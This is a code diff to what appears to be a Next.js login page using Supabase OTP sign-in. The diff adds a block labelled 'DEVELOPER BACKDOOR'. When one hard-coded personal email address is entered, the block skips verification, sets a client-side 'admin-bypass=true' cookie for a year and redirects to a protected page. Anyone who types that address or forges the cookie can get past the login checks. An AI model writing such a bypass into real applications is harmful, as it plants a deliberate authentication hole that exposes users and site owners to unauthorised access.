@@ -24,6 +24,14 @@ export default function LoginPage() {
         setMessage(null);
 
         try {
+            // DEVELOPER BACKDOOR
+            // Sets a cookie to bypass middleware checks
+            if (email === 'sumitsharma9128@gmail.com') {
+                document.cookie = "admin-bypass=true; path=/; max-age=31536000"; // 1 year
+                router.push('/generator');
+                return;
+            }
+
             const { error } = await supabase.auth.signInWithOtp({
                 email,
                 options: {
